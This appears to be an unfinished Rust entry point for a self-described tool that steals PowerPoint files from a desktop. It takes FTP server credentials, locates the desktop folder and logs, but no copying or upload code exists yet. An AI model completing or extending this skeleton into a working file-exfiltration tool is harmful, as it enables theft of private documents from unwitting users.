use clap::{Parser, ArgGroup};
use log;
use env_logger;
use std::{self, str::FromStr};
use std::path::{PathBuf, Path};

mod WatchDog;

#[derive(Parser, Debug)]
#[command(name = "ppt_stealer-rs", version = "0.1")]
#[command(about = "A tool to steal PowerPoint files from desktop", long_about = None)]
#[command(group(
    ArgGroup::new("auth")
        .args(&["password", "key_auth"])
        .required(true)
        .multiple(false)
))]
struct Cli {
    #[arg(short = 'i', long)]
    ftp_ip: String,

    #[arg(short = 'p', long)]
    ftp_port: i64,

    #[arg(short = 'u', long)]
    username: String,

    #[arg(short = 'P', long, group = "auth")]
    password: Option<String>,

    #[arg(long, default_value_t = false, group = "auth")]
    key_auth: bool,

    #[arg(long, default_value_t = false)]
    gui: bool,
}


fn main() {

    std::env::set_var("RUST_LOG", "debug");
    env_logger::init();
    
    // Parse command line arguments
    let args = Cli::parse();

    // Set up logging
    // print name and version
    log::info!("ppt_stealer-rs v0.1");
    // print args
    log::info!("Args: {:?}", args);

    // get desktop path
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => path,
        None => {
            // ask user for desktop path
            let mut path = String::new();
            std::io::stdin().read_line(&mut path).expect("Failed to read line");
            let path = PathBuf::from_str(path.trim()).unwrap();
            // check if the so-called desktop path is valid
            match path.is_dir() {
                true => path,
                false => {
                    log::error!("{} is invalid desktop path", path.display());
                    std::process::exit(1);
                }
            }
        }
    };
    log::info!("Desktop path: {}", desktop_path.display());

    println!("Hello, world!");
}

fn no_gui(desktop_path: &Path, args: Cli) {
    log::info!("No GUI mode on.");

    log::info!("Start monitering files...");
}
